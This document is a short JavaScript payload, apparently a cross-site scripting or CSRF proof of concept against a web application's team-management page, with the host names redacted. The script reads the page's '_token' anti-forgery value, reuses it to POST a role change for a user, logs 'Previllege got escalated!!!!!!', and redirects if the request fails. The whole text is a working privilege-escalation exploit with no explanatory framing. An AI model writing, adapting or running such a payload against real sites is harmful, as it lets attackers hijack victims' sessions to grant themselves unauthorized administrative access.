function email() {
        var req = new XMLHttpRequest();
        req.open('GET','https://xxxxx.com/team',false);
        req.send();
        var response = req.responseText;
        var response_headers = req.getAllResponseHeaders();  
        var parser = new DOMParser();
        var doc = parser.parseFromString(response, "text/html")
        var token = doc.getElementsByName('_token')[0].value;

        var x = new XMLHttpRequest();
        x.open("POST", "https://xxxx.com/team/user/xxxx", false);
        x.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
        x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        x.setRequestHeader("Accept-Language", "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7");
        var body = "_token="+encodeURIComponent(token)+"&roles%5B%5D=2";
        x.send(body);
        console.log("Previllege got escalated!!!!!!");
      }
      try {
        email();
      }catch(e){
        location.href = "https://xxxx.com/team"
      }
